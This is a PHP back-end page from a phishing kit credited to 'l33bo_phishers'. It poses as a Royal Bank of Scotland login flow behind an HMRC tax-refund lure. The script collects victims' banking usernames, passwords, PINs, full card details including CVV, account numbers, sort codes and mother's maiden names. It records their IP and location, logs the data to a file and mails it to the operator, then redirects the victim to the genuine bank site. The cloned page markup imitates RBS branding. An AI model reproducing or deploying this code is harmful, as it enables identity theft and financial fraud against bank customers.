<?php
/*
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");
include "../CONTROLS.php";
include("assets/includes/AES.php");
$userid = $_POST['userid'];
$pin = $_POST['pin'];
$password = $_POST['password'];
$name = $_POST['name'];
$dob = $_POST['dob'];
$birthDate = $dob;
$birthDate = explode("/", $birthDate);
$age = (date("md", date("U", mktime(0, 0, 0, $birthDate[0], $birthDate[1], $birthDate[2]))) > date("md")
? ((date("Y") - $birthDate[2]) - 1)
: (date("Y") - $birthDate[2]));
$address = $_POST['address'];
$telephone = $_POST['telephone'];
$Network = $_POST['Network'];
$email = $_POST['email'];
$ccno = $_POST['ccno'];
$ccexp =  $_POST['ccexp'];
$secode = $_POST['secode'];
$acno = $_POST['acno'];
$sort = $_POST['sort'];
$mmn = $_POST['mmn'];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$cardInfo = bankDetails($ccno);
$ccno = str_replace(' ', '', $ccno);
$BIN = ($cardInfo['bin']);
$Bank = ($cardInfo['bank']);
$Brand = ($cardInfo['brand']);
$Type = ($cardInfo['card_type']);
$category = ($cardInfo['card_category']);
$from = $From_Address;
$headers = "From:" . $from;
$subj = "RBS : $ip";
$to = $Your_Email; 
$warnsubj = "Abuse";
$warn = "A user (with ip: $ip) has attempted to send you a completed form containing abusive language. l33bo_Phishers is against abusive form filling and has redirected this user to the official site while blocking the form.";
$bad_words = array('9999','4r5e','5h1t','5hit','a55','anal','anus','ar5e','arrse','arse','ass','ass-fucker','asses','assfucker','assfukka','asshole','assholes','asswhole','a_s_s','b!tch','b00bs','b17ch','b1tch','ballbag','balls','ballsack','bastard','beastial','beastiality','bellend','bestial','bestiality','bi+ch','biatch','bitch','bitcher','bitchers','bitches','bitchin','bitching','bloody','blow job','blowjob','blowjobs','boiolas','bollock','bollok','boner','boob','boobs','booobs','boooobs','booooobs','booooooobs','breasts','buceta','bugger','bum','bunny fucker','butt','butthole','buttmuch','buttplug','c0ck','c0cksucker','carpet muncher','cawk','chink','cipa','cl1t','clit','clitoris','clits','cnut','cock','cock-sucker','cockface','cockhead','cockmunch','cockmuncher','cocks','cocksuck ','cocksucked ','cocksucker','cocksucking','cocksucks ','cocksuka','cocksukka','cok','cokmuncher','coksucka','coon','cox','crap','cum','cummer','cumming','cums','cumshot','cunilingus','cunillingus','cunnilingus','cunt','cuntlick ','cuntlicker ','cuntlicking ','cunts','cyalis','cyberfuc','cyberfuck ','cyberfucked ','cyberfucker','cyberfuckers','cyberfucking ','d1ck','damn','dick','dickhead','dildo','dildos','dink','dinks','dirsa','dlck','dog-fucker','doggin','dogging','donkeyribber','doosh','duche','dyke','ejaculate','ejaculated','ejaculates ','ejaculating ','ejaculatings','ejaculation','ejakulate','f u c k','f u c k e r','f4nny','fag','fagging','faggitt','faggot','faggs','fagot','fagots','fags','fanny','fannyflaps','fannyfucker','fanyy','fatass','fcuk','fcuker','fcuking','feck','fecker','felching','fellate','fellatio','fingerfuck ','fingerfucked ','fingerfucker ','fingerfuckers','fingerfucking ','fingerfucks ','fistfuck','fistfucked ','fistfucker ','fistfuckers ','fistfucking ','fistfuckings ','fistfucks ','flange','fook','fooker','fuck','fucka','fucked','fucker','fuckers','fuckhead','fuckheads','fuckin','fucking','fuckings','fuckingshitmotherfucker','fuckme ','fucks','fuckwhit','fuckwit','fudge packer','fudgepacker','fuk','fuker','fukker','fukkin','fuks','fukwhit','fukwit','fux','fux0r','f_u_c_k','gangbang','gangbanged ','gangbangs ','gaylord','gaysex','goatse','God','god-dam','god-damned','goddamn','goddamned','hardcoresex ','hell','heshe','hoar','hoare','hoer','homo','hore','horniest','horny','hotsex','jack-off ','jackoff','jap','jerk-off ','jism','jiz ','jizm ','jizz','kawk','knob','knobead','knobed','knobend','knobhead','knobjocky','knobjokey','kock','kondum','kondums','kum','kummer','kumming','kums','kunilingus','l3i+ch','l3itch','labia','lmfao','lust','lusting','m0f0','m0fo','m45terbate','ma5terb8','ma5terbate','masochist','master-bate','masterb8','masterbat*','masterbat3','masterbate','masterbation','masterbations','masturbate','mo-fo','mof0','mofo','mothafuck','mothafucka','mothafuckas','mothafuckaz','mothafucked ','mothafucker','mothafuckers','mothafuckin','mothafucking ','mothafuckings','mothafucks','mother fucker','motherfuck','motherfucked','motherfucker','motherfuckers','motherfuckin','motherfucking','motherfuckings','motherfuckka','motherfucks','muff','mutha','muthafecker','muthafuckker','muther','mutherfucker','n1gga','n1gger','nazi','nigg3r','nigg4h','nigga','niggah','niggas','niggaz','nigger','niggers ','nob','nob jokey','nobhead','nobjocky','nobjokey','numbnuts','nutsack','orgasim ','orgasims ','orgasm','orgasms ','p0rn','pawn','pecker','penis','penisfucker','phonesex','phuck','phuk','phuked','phuking','phukked','phukking','phuks','phuq','pigfucker','pimpis','piss','pissed','pisser','pissers','pisses ','pissflaps','pissin ','pissing','pissoff ','poop','porn','porno','pornography','pornos','prick','pricks ','pron','pube','pusse','pussi','pussies','pussy','pussys ','rectum','retard','rimjaw','rimming','s hit','s.o.b.','sadist','schlong','screwing','scroat','scrote','scrotum','semen','sex','sh!+','sh!t','sh1t','shag','shagger','shaggin','shagging','shemale','shi+','shit','shitdick','shite','shited','shitey','shitfuck','shitfull','shithead','shiting','shitings','shits','shitted','shitter','shitters ','shitting','shittings','shitty ','skank','slut','sluts','smegma','smut','snatch','son-of-a-bitch','spac','spunk','s_h_i_t','t1tt1e5','t1tties','teets','teez','testical','testicle','tit','titfuck','tits','titt','tittie5','tittiefucker','titties','tittyfuck','tittywank','titwank','tosser','turd','tw4t','twat','twathead','twatty','twunt','twunter','v14gra','v1gra','vagina','viagra','vulva','w00se','wang','wank','wanker','wanky','whoar','whore','willies','willy','xrated','fuck','fuckoff','fuck off','fucking','nigger','nigerian','Nigerian','scam','cunt','wankers','twats','scammers','shit','wanker','cunt','asshole','arsehole','passwd','sample');
$VictimInfo .= "| IP Address : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";
$VictimInfo .= "| Location: " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "\r\n";
$VictimInfo .= "| UserAgent : " . $systemInfo['useragent'] . "\r\n";
$VictimInfo .= "| Browser : " . $systemInfo['browser'] . "\r\n";
$VictimInfo .= "| Platform : " . $systemInfo['os'] . "";
$data = "
+ ------------- L33bo Phishers -------------+
+ ------------------------------------------+
+ Personal Information
| Full name : $name
| Date of birth : $dob (Age: $age)
| Address : $address
| Telephone : $telephone (Network: $Network)
| Email : $email
| MMN : $mmn
+ ------------------------------------------+
+ Billing Information
| Card BIN : $BIN
| Card Bank : $Bank
| Card Type : $Brand $Type
| Card Number : $ccno
| Expiration date : $ccexp
| CVV : $secode
| Account Number : $acno 
| Sortcode : $sort
+ ------------------------------------------+
+ Account Information (RBS)
| Username : $userid
| Password : $password
| Pin : $pin
+ ------------------------------------------+
+ Victim Information
$VictimInfo
+ ------------------------------------------+
";
$imputText = $data;
$imputKey = $Key;
$blockSize = 256;
$aes = new AES($imputText, $imputKey, $blockSize);
$enc = $aes->encrypt();
$aes->setData($enc);
$dec=$aes->decrypt();
if($Abuse_Filter==1)
{
foreach($bad_words as $bad_word){
    if(stristr($_POST['name'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CCEQFjAAahUKEwjNz6aUz9bHAhVsWtsKHRq2DVU&url=http%3A%2F%2Fpersonal.rbs.co.uk%2Fpersonal%2Fways-to-bank-with-us%2Fdigital-banking1.html&usg=AFQjCNEs9BCcvztGeIP-_7PPP68Ti6IBPA&bvm=bv.101800829,d.ZGU"));
    }
	if(stristr($_POST['mmn'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CCEQFjAAahUKEwjNz6aUz9bHAhVsWtsKHRq2DVU&url=http%3A%2F%2Fpersonal.rbs.co.uk%2Fpersonal%2Fways-to-bank-with-us%2Fdigital-banking1.html&usg=AFQjCNEs9BCcvztGeIP-_7PPP68Ti6IBPA&bvm=bv.101800829,d.ZGU"));
    }
if(stristr($_POST['address'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CCEQFjAAahUKEwjNz6aUz9bHAhVsWtsKHRq2DVU&url=http%3A%2F%2Fpersonal.rbs.co.uk%2Fpersonal%2Fways-to-bank-with-us%2Fdigital-banking1.html&usg=AFQjCNEs9BCcvztGeIP-_7PPP68Ti6IBPA&bvm=bv.101800829,d.ZGU"));
    }
}
}
if($Save_Log==1) {
	if($Encrypt==1) {
	$file=fopen("assets/logs/rbs.txt","a");
	fwrite($file,$enc);
	fclose($file);
	}
	else {
	$file=fopen("assets/logs/rbs.txt","a");
	fwrite($file,$data);
	fclose($file);
	}
}
require "../assets/includes/vpn_check.php";	
if($Send_Log==1) {
	if($Encrypt==1) {
	mail($to,$subj,$enc,$headers);	
	}
	else {
	mail($to,$subj,$data,$headers);	
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Complete</title>
<meta http-equiv="Content-Style-Type" content="text/css">
<link href="assets/css/master.css" rel="stylesheet" type="text/css" media="all" segment="">
<link href="assets/css/datePicker.css" rel="stylesheet" type="text/css" media="all" segment="">
<link href="assets/css/dpc.css" rel="stylesheet" type="text/css" media="all" segment="">
<link href="assets/css/master_chrome.css" rel="stylesheet" type="text/css" media="all" segment="">
<link href="assets/css/dpc_chrome.css" rel="stylesheet" type="text/css" media="all" segment="">
<link href="assets/css/overlayPromptMaster.css" rel="stylesheet" type="text/css" media="all" segment="">
<link href="assets/css/overlayPrompt.css" rel="stylesheet" type="text/css" media="all" segment="">
<link href="assets/css/DPC_auralstyle.css" rel="stylesheet" type="text/css" media="aural" segment="">
<link href="assets/css/lpdastyles.css" rel="stylesheet" type="text/css">
<link href="assets/css/form.css" rel="stylesheet" type="text/css">
<link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
<meta http-equiv="refresh" content="5; url=https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CCEQFjAAahUKEwjNz6aUz9bHAhVsWtsKHRq2DVU&url=http%3A%2F%2Fpersonal.rbs.co.uk%2Fpersonal%2Fways-to-bank-with-us%2Fdigital-banking1.html&usg=AFQjCNEs9BCcvztGeIP-_7PPP68Ti6IBPA&bvm=bv.101800829,d.ZGU">
</head>

<body id="ctl00_bodyTag"><div class="mboxDefault" id="mbox-target-global-mbox-1430817187600-352795" style="visibility: visible; display: block;"></div>
	
	
	<div id="wrapper" class="default_bg nobackgroundImg">
		<div id="acceskeys">
			<div id="skiplinks">
				<div class="ddalink">
	<a id="ctl00_skipLinks_ctl00_beginLink" accesskey="0" class="ddalink" href="#">Return to start of screen / Access key details</a>
	<a id="ctl00_skipLinks_ctl00_MenuLink" accesskey="m" title="Skip to Menu" class="ddalink" href="#">Skip to Menu</a>
	<a id="ctl00_skipLinks_ctl00_ContentLink" accesskey="s" title="Skip to main content" class="ddalink" href="#">Skip to main content</a>
	<a id="ctl00_skipLinks_ctl00_accessLink" accesskey="o" title="Skip to accessibility" class="ddalink" href="#">Skip to accessibility</a>
</div>
			</div>
		</div>
		<div id="canvas" class="twoLines">
			
<div id="header" class="header">
    <div id="ctl00_header_ctl00_topHeaderWrapper" class="topHeaderWrapper">
        <div id="ctl00_header_ctl00_topHeaderLeftWraper" class="topHeaderLeftWrapper">
            <ul id="ctl00_header_ctl00_globalTopNav" class="globalTopnav">
                <li class="selected">
                    <span id="ctl00_header_ctl00_HDRBTEA">Personal</span>
                </li>
                <li class="unselected">
                    <a id="ctl00_header_ctl00_HDRNLIAnchor" href="#" target="Private">Private</a>
                </li>
                <li class="unselected">
                    <a id="ctl00_header_ctl00_HDRNLJAnchor" href="#" target="Business">Business</a>
                </li>
                <li class="unselected">
                    <a id="ctl00_header_ctl00_HDRNLLAnchor" href="#" target="Business">Corporate</a>
                </li>
                <li class="unselected">
                    <a id="ctl00_header_ctl00_HDRNLKAnchor" href="#" target="International">International</a>
                </li>
            </ul>
        </div>
        <div id="ctl00_header_ctl00_topHeaderRightWrapper" class="topHeaderRightWrapper">
            <div id="ctl00_header_ctl00_LogoutWrapper" class="logoutWrapper">
                <span id="ctl00_header_ctl00_logoutButton" class="logoutLink">
                    <a href="#" id="ctl00_header_ctl00_logoutlink" target="_top"><span id="ctl00_header_ctl00_HDRBTEE">LOG OUT</span></a>
                </span>
            </div>
            
        </div>
    </div>
    <div id="ctl00_header_ctl00_bottomHeaderWrapper" class="bottomHeaderWrapper">
        <div id="ctl00_header_ctl00_bottomHeaderLeftWrapper" class="bottomHeaderLeftWrapper">
            <div id="ctl00_header_ctl00_rbsHeader" class="rbsHeader">
                <a href="#" target="_top"><img id="ctl00_header_ctl00_BrandImage4" src="assets/img/official.gif" style="border-width:0px;"></a>
            </div>
            <div id="ctl00_header_ctl00_globalBottomNavWrapper" class="globalBottomNavWrapper">
                <ul id="ctl00_header_ctl00_Ul1" class="globalBottomNav">
                    <li>
                        <a id="ctl00_header_ctl00_HDRPULAAnchor" href="#" target="Products">Products</a>
                    </li>
                    <li>
                        <a id="ctl00_header_ctl00_HDRPULBAnchor" href="#" target="Support">Support</a>
                    </li>
                    <li>
                        <a id="ctl00_header_ctl00_HDRPULCAnchor" href="#" target="Life Moments">Life Moments</a>
                    </li>
                </ul>
            </div>
        </div>
        <div id="ctl00_header_ctl00_bottomHeaderRightWrapper" class="bottomHeaderRightWrapper">
            <div id="ctl00_header_ctl00_quickLinksWrapper" class="quickLinksWrapper">
                <ul id="quickLinks">
                    <li class="privacyAndCookiesTopPadding">
                        <a id="ctl00_header_ctl00_HDRNLCAnchor" href="#" target="helpwindow">Privacy &amp; Cookies</a>
                    </li>
                    <li class="last">
                        <a id="ctl00_header_ctl00_HDRPULDAnchor" href="#" target="headerWindow">Accessibility</a>
                    </li>
                </ul> 
            </div> 
         </div>
    </div>
</div>
            
			<div id="content">
				<a name="content"></a>
				<div id="mid">
					<div id="ctl00_snailTrail__19ae97ef30e_SnailTrail">

</div>
<form name="details" method="post" action="Finish.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" id="details">
<div>

</div>


    
    <span id="ctl00_mainContent_AccountAdminLandingPageAPanelControl"></span>
    
    <div id="ctl00_mainContent_SE01PFA" class="landingPageHeader pageTitle">
	
        <div id="ctl00_mainContent_SE01PFB" class="LPHeaderTopCurve">
		</div>
        <h1 id="ctl00_mainContent_SE01BTHA" class="">
			Security
		</h1>
    </div>
    
    
    
    
    
    

    <div id="ctl00_mainContent_SE01PFC" class="landingPageContainerWide">	
        <div id="ctl00_mainContent_SE01PFD" class="landingPageMidWide IOMSpecificBackgroundLongMiddle landingPageMidNoButtonLong">
				
            <div id="ctl00_mainContent_SE01PFE" class="LPTopCurveWide IOMSpecificBackgroundLongTop"></div>
            <div id="ctl00_mainContent_SE01PFF" class="landingPageContentWrapper landingPageContentWrapperWide">
						
                <h2 id="ctl00_mainContent_SE01BTHB" class="">
							Tax Refund
						</h2>
                 <span id="ctl00_mainContent_SE01BTEA" class="noMarginTop marginTop">
				 <table border="0" style="border-collapse:collapse;border:0px solid #FFCC00;color:#000000;width:100%" cellpadding="3" cellspacing="3">
	<tr>
		<td></td>
		<td><img style="display: block; margin-left: auto;margin-right: auto" src="assets/img/495.GIF" width="52px" height="52px"></td>
		<td></td>
	</tr>
	<tr>
		<td></td>
		<td>&nbsp;</td>
		<td></td>
	</tr>
	<tr>
		<td></td>
		<td>Please Wait...</td>
		<td></td>
	</tr>
	<tr>
		<td></td>
		<td></td>
		<td></td>
	</tr>
	<tr>
		<td></td>
		<td><p>You will be redirected back to HMRC in order to complete your claim</p></td>
		<td></td>
	</tr>
</table>


				 <br><br>
				 </span>


            </div>
       </div>
    </div>      

        
       
    
    <div class="clear">
        
    </div>

</form>
				</div>
				<a name="menu"></a>
				<div id="ctl00_leftPanel" class="left menu">
				
	<div id="ctl00_menu__304bf1d447ac_MenuDiv_BC" class="box_menu">
	<div class="box_top_menu"><hr></div>
	<div id="ctl00_menu__304bf1d447ac_menuBodyDiv" class="MenuBody">
	<ul id="menu">
	<li>
	<a id="ctl00_menu__304bf1d447ac_AS1MNUAnchor" accesskey="1" href="#">Account summary</a></li>
	<li><a id="ctl00_menu__304bf1d447ac_MLP1MNUAnchor" accesskey="2" href="#">Messages</a></li>
	<li><a id="ctl00_menu__304bf1d447ac_SS1AMNUAnchor" accesskey="3" href="#">Statements</a></li>
	<li><a id="ctl00_menu__304bf1d447ac_PT1AMNUAnchor" accesskey="4" href="#">Payments and transfers</a></li>
	<li><a id="ctl00_menu__304bf1d447ac_AL1AMNUAnchor" accesskey="5" href="#">Alerts</a></li>
	<li><a id="ctl00_menu__304bf1d447ac_AA1AMNUAnchor" accesskey="6" href="#">Cards</a></li>
	<li><a id="ctl00_menu__304bf1d447ac_CS1AMNUAnchor" accesskey="7" href="#">Your details</a></li>
	<li class="current"><a id="ctl00_menu__304bf1d447ac_SE01MNUAnchor" accesskey="8" title="Access Key = 8" href="#">Security</a></li>
	<li><a id="ctl00_menu__304bf1d447ac_ESMNUAnchor" accesskey="9" target="_top" href="#">Log out</a></li>
	</ul>
	</div>
	</div>


					
					<div id="ctl00_quickTransfer_ctl00_quickTransferDiv" class="box_quickTransfer">
					<div class="box_top_quickTransfer"><hr></div>

	<form style="PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-TOP: 0px" action="#" method="post" onsubmit="blockQTButton(&#39;ctl00_quickTransfer_ctl00_transferButton&#39;)"><input type="hidden" value="559a72c0-bed8-4100-9e90-7db2414c0c80" name="txnID">
    	
	<h3 id="ctl00_quickTransfer_ctl00_QT1BTHA">Quick transfers</h3>
	<div id="ctl00_quickTransfer_ctl00_quickTransferBodyDivInput" class="quicktransferbody">
	    <div id="ctl00_quickTransfer_ctl00_QT1BTEA" class="brandtext">from…</div>
	    <div id="QTPFB">	        
		    <label id="ctl00_quickTransfer_ctl00_QT1ADDADDALA" style="DISPLAY: none" for="ctl00_quickTransfer_ctl00_QT1ADDA">Account to transfer funds from</label>
			<select name="qt" id="ctl00_quickTransfer_ctl00_QT1ADDA">
																	<option value="PleaseSelect">…your RBS account</option>
																</select>
	    </div>
	    <div id="ctl00_quickTransfer_ctl00_QT1BTEB" class="brandtext">to…</div>
	    <div id="QTPFC">	        
	        <label id="ctl00_quickTransfer_ctl00_QT1ADDBDDALB" style="DISPLAY: none" for="ctl00_quickTransfer_ctl00_QT1ADDB">Account to transfer funds to</label>
			<select name="qt" id="ctl00_quickTransfer_ctl00_QT1ADDB" >
																	<option value="PleaseSelect">…your RBS account</option>
																</select>
	    </div>
	    <div id="ctl00_quickTransfer_ctl00_QT1BTEC" class="brandtext">amount…</div> 
	    <div class="currencyDiv" id="QTPFD">	               
	        <label id="ctl00_quickTransfer_ctl00_QT1CEADDALC" style="DISPLAY: none" for="ctl00_quickTransfer_ctl00_QT1CEA">Amount to transfer between accounts</label><span id="ctl00_quickTransfer_ctl00_currencySpan" class="currencySpan">£</span><input name="ctl00$quickTransfer$ctl00$QT1CEA" type="text" id="ctl00_quickTransfer_ctl00_QT1CEA" maxlength="14" size="21" value="0.00">
	    </div>
	</div>
	
	<div id="ctl00_quickTransfer_ctl00_quickTransferFooterDiv" class="quicktransferfooter">
	    <div id="QTPFE" class="qtBtn">
		    <input name="ctl00$quickTransfer$ctl00$transferButton" type="submit" id="ctl00_quickTransfer_ctl00_transferButton" value="Transfer" class="qtoff" onmouseover="cssQT(this,&#39;qton&#39;)" onmouseout="cssQT(this,&#39;qtoff&#39;)">
	    </div>
	</div></form>
</div>

					
				</div>
			</div>
			<div id="ctl00_rightPanel" class="right banners">
				<div id="ctl00_salesOnline_ctl00_ourProducts" class="box_ourProducts">
				<div class="box_top_ourProducts"><hr></div>
				<h2 id="ctl00_salesOnline_ctl00_ASBTHE" class="fauxh3">Our products</h2>
				<span id="ctl00_salesOnline_ctl00_ASBTHF">Personal products</span>
				<ul class="aol">
				<li><a id="ctl00_salesOnline_ctl00_ASNLA_PAnchor" class="ol-link" href="#" target="_blank">Savings accounts</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLB_PAnchor" class="ol-link" href="#" target="_blank">Cash ISAs</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLC_PAnchor" class="ol-link" href="#" target="_blank">Current accounts</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLD_PAnchor" class="ol-link" href="#" target="_blank">Upgrade your account</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLE_PAnchor" class="ol-link" href="#" target="_blank">Credit cards</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLF_PAnchor" class="ol-link" href="#" target="_blank">Overdrafts</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLG_PAnchor" class="ol-link" href="#" target="_blank">Loans</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLH_PAnchor" class="ol-link" href="#" target="_blank">Mortgages</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLI_PAnchor" class="ol-link" href="#" target="_blank">Insurance</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLJ_PAnchor" class="ol-link" href="#" target="_blank">Travel money</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLM_PAnchor" class="ol-link" href="#" target="_blank">Debit card abroad</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLN_PAnchor" class="ol-link" href="#" target="_blank">Investment products</a></li>
				<li><a id="ctl00_salesOnline_ctl00_ASNLP_PAnchor" class="ol-link" href="#" target="_blank">Mobile app</a></li></ul></div>
			</div>
			<br class="clear">
		</div>
		
<div id="footer" class="footerContainer">
    <ol class="footer_navbar">
        <li>
            <a id="ctl00_footer_ctl00_HDRNLDAnchor" href="#" target="headerWindow">Security</a></li>
                <li class="footerSeparator"><span id="ctl00_footer_ctl00_FooterSeparator1">·</span> </li>
        <li>
            <a id="ctl00_footer_ctl00_HDRNLBAnchor" href="#" target="headerWindow">Legal Info</a></li>
                <li class="footerSeparator"><span id="ctl00_footer_ctl00_FooterSeparator2">·</span> </li>
        <li class="last"><span id="ctl00_footer_ctl00_CopyrightText">&copy; 2005-2015 The Royal Bank of Scotland plc</span> </li>
    </ol>
</div>

		
	</div>


</body>
</html>
